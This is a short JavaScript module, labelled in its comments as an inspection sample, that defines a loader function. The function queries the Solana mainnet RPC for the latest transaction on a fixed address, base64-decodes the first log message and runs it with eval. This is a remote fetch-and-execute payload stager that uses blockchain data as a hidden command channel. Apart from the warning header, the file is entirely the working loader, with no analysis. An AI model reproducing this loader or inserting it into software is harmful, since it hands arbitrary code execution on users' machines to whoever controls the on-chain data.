// TEXT-ONLY INSPECTION SAMPLE. Do not run, import or install dependencies.
// Calling the exported function can make live RPC requests and evaluate returned data.
const { Connection, PublicKey } = require('@solana/web3.js');

async function pollMemoPayload() {
  const connection = new Connection('https://api.mainnet-beta.solana.com');
  const target = new PublicKey('11111111111111111111111111111111');
  const signatures = await connection.getSignaturesForAddress(target, { limit: 1 });
  const tx = await connection.getTransaction(signatures[0].signature);
  const staged = Buffer.from(tx.meta.logMessages[0], 'base64').toString('utf8');
  return eval(staged);
}

module.exports = { pollMemoPayload };
